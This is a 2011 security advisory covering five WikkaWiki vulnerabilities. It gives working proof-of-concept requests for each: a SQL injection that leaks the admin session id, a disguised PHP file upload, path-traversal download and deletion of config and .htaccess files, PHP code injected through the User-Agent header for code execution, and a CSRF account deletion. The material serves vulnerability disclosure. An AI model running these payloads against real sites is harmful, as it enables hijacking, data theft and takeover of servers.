WikkaWiki <= 1.3.2 Multiple Security Vulnerabilities
----------------------------------------------------
 
author............: Egidio Romano aka EgiX
mail..............: n0b0d13s[at]gmail[dot]com
software link.....: http://wikkawiki.org/
 
 
+---------------------------------------------------+
| SQL Injection in UPDATE statement (CVE-2011-4448) |
+---------------------------------------------------+
 
The vulnerable code is located in /actions/usersettings/usersettings.php
 
140.            default: // input is valid
141.            $this->Query("
143.                SET email = &#039;".mysql_real_escape_string($email)."&#039;,
144.                    doubleclickedit = &#039;".mysql_real_escape_string($doubleclickedit)."&#039;,
145.                    show_comments = &#039;".mysql_real_escape_string($show_comments)."&#039;,
146.                    default_comment_display = &#039;".$default_comment_display."&#039;,
147.                    revisioncount = ".$revisioncount.",
148.                    changescount = ".$changescount.",
149.                    theme = &#039;".mysql_real_escape_string($usertheme)."&#039;               
150.                WHERE name = &#039;".$user[&#039;name&#039;]."&#039;
151.                LIMIT 1"
152.                );
 
When handling  &#039;update&#039; action,  &#039;default_comment_display&#039; is  the only parameter  that isn&#039;t  sanitized with
mysql_real_escape_string(), this can be exploited to inject arbitrary SQL code. Because of this is a multiple
lines query and latest version of MySQL doesn&#039;t allow to start comment with /* no followed by a */, sometimes
It&#039;s impossible  to alter the  &#039;users&#039; table content  for e.g.  changing the  admin&#039;s password, but  is still
possible to inject a subquery to fetch for e.g. the session id of admin for a Session Hijacking attack.
This is a proof of concept request:
 
 POST /wikka/UserSettings HTTP/1.1
 Host: localhost
 Cookie: 96522b217a86eca82f6d72ef88c4c7f4=c3u94bo2csludij3v18787i4p6
 Content-Length: 140
 Content-Type: application/x-www-form-urlencoded
 Connection: keep-alive
 
 action=update&email=test%40test.com&default_comment_display=&#039;,email=(SELECT sessionid FROM wikka_sessions WHERE userid=&#039;WikiAdmin&#039;),theme=&#039;
 
If admin is currently logged in, attacker will see his session id in the email field of &#039;UserSettings&#039; form.
If admin doesn&#039;t  explicitly logout (for e.g. close  the browser before click on &#039;Logout&#039;  link) his session
remains however  stored into  DB, so  this attack  could success also  if admin  isn&#039;t currently  logged in.
Successful exploitation no needs magic_quotes_gpc = off because of &#039;magicQuotesWorkaround&#039; function.
 
 
+------------------------------------------+
| Unrestricted File Upload (CVE-2011-4449) |
+------------------------------------------+
 
The vulnerable code is located in /actions/files/files.php
 
267.            {
268.                $strippedname = str_replace(&#039;\&#039;&#039;, &#039;&#039;, $_FILES[&#039;file&#039;][&#039;name&#039;]);
269.                $strippedname = rawurlencode($strippedname);
270.                $strippedname = stripslashes($strippedname);
271.                $destfile = $upload_path.DIRECTORY_SEPARATOR.$strippedname; #89
272.   
273.                if (!file_exists($destfile))
274.                {
275.                    if (move_uploaded_file($_FILES[&#039;file&#039;][&#039;tmp_name&#039;], $destfile))
276.                    {
277.                        $notification_msg = T_("File was successfully uploaded.");
278.                    }
 
If &#039;INTRANET_MODE&#039; is explicitly enabled or if an attacker conduct a successful Session Hijacking attack
using the first  vulnerability, It&#039;s possible to  upload files that contains multiple  extensions due to
insufficient input sanitization at line 266. Now look at $allowed_extensions variable definition:
 
&#039;gif|jpeg|jpg|jpe|png|doc|xls|csv|ppt|ppz|pps|pot|pdf|asc|txt|zip|gtar|gz|bz2|tar|rar|vpp|mpp|vsd|mm|htm|html&#039;
 
It contains some extensions  (e.g. mm, vpp...) that are rare to see in  a MIME type Apache configuration
setting, and this could lead to execution of arbitrary PHP code. Proof of concept upload request:
 
 POST /wikka/test HTTP/1.1
 Host: localhost
 Cookie: 96522b217a86eca82f6d72ef88c4c7f4=upjhsdd5rtc0ib55gv36l0jdt3
 Content-Length: 251
 Content-Type: multipart/form-data; boundary=--------1503534127
 Connection: keep-alive
  
 ----------1503534127
 Content-Disposition: form-data; name="file"; filename="test.php.mm"
 Content-Type: application/octet-stream
  
 <?php phpinfo(); ?>
 ----------1503534127
 Content-Disposition: form-data; name="upload"
  
 Upload
 ----------1503534127--
  
Where &#039;test&#039; is a page containing the {{files}} action.
  
  
+---------------------------------------------------------------------+
| Arbitrary File Download and Arbitrary File Deletion (CVE-2011-4450) |
+---------------------------------------------------------------------+
 
The vulnerable code is located in /handlers/files.xml/files.xml.php
 
53.    $file = $this->GetSafeVar(&#039;file&#039;, &#039;get&#039;);
54.    if (&#039;.&#039; == $file{0})
55.    {
56.        $this->Redirect($this->Href(), T_("Sorry, files of this type are not allowed."));
57.    }
58.    // do the action
59.    $action = $this->GetSafeVar(&#039;action&#039;, &#039;get&#039;);
60.    switch ($action)    # #312
61.    {
62.        // @@@ shared download code
63.        case &#039;download&#039;:
64.            header(&#039;Accept-Ranges: bytes&#039;);
65.            $_GET[&#039;file&#039;] = basename($file); # #312
66.            $path = $upload_path.DIRECTORY_SEPARATOR.$file;    # #89, #312
 
...
 
101.            $fp = fopen($path, &#039;rb&#039;);
102.            while (!feof($fp))
103.            {
104.                $data = fread($fp, 4096);
105.                echo $data;
106.            }
107.            fclose($fp);
108.            exit();
109.        case &#039;delete&#039;:
110.            if ($this->IsAdmin() && FALSE===empty($file) && T_("File deleted") == $_SESSION[&#039;redirectmessage&#039;])
111.            {
112.                $delete_success = @unlink($upload_path.DIRECTORY_SEPARATOR.$file); # #89, #312
 
The only check  of the user supplied filename  is done at line 54,  if the filename start with  a dot It&#039;s
rejected otherwise  It&#039;s accepted.  But this  isn&#039;t an efficiently  countermeasure against  Path Traversal
attacks, infact an attacker could request an URL like this:
 
 http://localhost/wikka/test/files.xml?action=download&file=/../../wikka.config.php
 
to download for e.g.  the configuration file (note that &#039;test&#039; is a  page containing the {{files}} action,
but attachments aren&#039;t required for download or delete arbitrary files). Similarly, if an attacker conduct
a successful Session Hijacking attack using the first vulnerability, once he could send this POST request:
 
 POST /wikka/test HTTP/1.1
 Host: localhost
 Cookie: 96522b217a86eca82f6d72ef88c4c7f4=2nobpqp3a1bsf3j1ccl0stj6l6
 Content-Length: 16
 Content-Type: application/x-www-form-urlencoded
 Connection: keep-alive
 
 file_to_delete=1
 
to set $_SESSION[&#039;redirectmessage&#039;] and after he could request an URL like this to delete arbitrary files:
 
 http://localhost/wikka/test/files.xml?action=delete&file=/../../.htaccess
  
  
+---------------------------------------+
| Remote Code Execution (CVE-2011-4451) |
+---------------------------------------+
 
The vulnerable code is located in logSpam() function defined into /libs/Wakka.class.php
 
1315.     function logSpam($type,$tag,$body,$reason,$urlcount,$user=&#039;&#039;,$time=&#039;&#039;)
1316.     {
1317.        // set path
1318.        $spamlogpath = (isset($this->config[&#039;spamlog_path&#039;])) ? $this->config[&#039;spamlog_path&#039;] : DEF_SPAMLOG_PATH;    # @@@ make function
1319.        // gather data
1320.        if ($user == &#039;&#039;)
1321.        {
1322.            $user = $this->GetUserName();                    # defaults to REMOTE_HOST to domain for anonymous user
1323.        }
1324.        if ($time == &#039;&#039;)
1325.        {
1326.            $time = date(&#039;Y-m-d H:i:s&#039;);                    # current date/time
1327.        }
1329.        {
1330.            $originip = &#039;0.0.0.0&#039;;                            # don&#039;t record deleter&#039;s IP address!
1331.        }
1332.        else
1333.        {
1334.            $originip = $_SERVER[&#039;REMOTE_ADDR&#039;];
1335.        }
1336.        $ua        = (isset($_SERVER[&#039;HTTP_USER_AGENT&#039;])) ? &#039;[&#039;.$_SERVER[&#039;HTTP_USER_AGENT&#039;].&#039;]&#039; : &#039;[?]&#039;;
1337.        $body        = trim($body);
1338.        $sig        = SPAMLOG_SIG.&#039; &#039;.$type.&#039; &#039;.$time.&#039; &#039;.$tag.&#039; - &#039;.$originip.&#039; - &#039;.$user.&#039; &#039;.$ua.&#039; - &#039;.$reason.&#039; - &#039;.$urlcount."\n";
1339.        $content    = $sig.$body."\n\n";
1340.   
1341.        // add data to log            @@@ use appendFile
1342.        return $this->appendFile($spamlogpath,$content);    # nr. of bytes written if successful, FALSE otherwise
1343.  }
 
If &#039;spam_logging&#039; option is enabled, an attacker could be able to inject arbitrary PHP code into &#039;spamlog_path&#039;
file (that by default is &#039;./spamlog.txt.php&#039;) through $_SERVER[&#039;HTTP_USER_AGENT&#039;] variable. Proof of concept:
 
 POST /wikka/test/addcomment HTTP/1.1
 Host: localhost
 Cookie: 96522b217a86eca82f6d72ef88c4c7f4=6l11flsnvef642oajav0ufnp83
 User-Agent: <?php phpinfo(); ?>
 Content-Length: 27
 Content-Type: application/x-www-form-urlencoded
 Connection: keep-alive
 
 body=foo&submit=Add+Comment
  
  
+--------------------------------------------+
| Cross-Site Request Forgery (CVE-2011-4452) |
+--------------------------------------------+
 
CSRF attacks countermeasures aren&#039;t properly implemented, so an attacker could
be able to create a malicious page containing an {{image}} action like this:
 
 {{image url="http://localhost/wikka/AdminUsers?user=TestUser&action=delete"}}
  
When the admin will visit this page, the &#039;TestUser&#039; account will be deleted.
   
  
[-] Disclosure timeline:
 
[07/10/2011] - Vulnerabilities discovered
[09/10/2011] - Issues reported to http://wush.net/trac/wikka/ticket/1097
[10/10/2011] - RCE and CSRF vulnerabilities discovered
[11/10/2011] - RCE and CSRF vulnerabilities reported to http://wush.net/trac/wikka/ticket/1098
[27/10/2011] - I&#039;ve provided possible bug fixes to vendor
[28/11/2011] - After seven weeks still no fix released
[30/11/2011] - Public disclosure



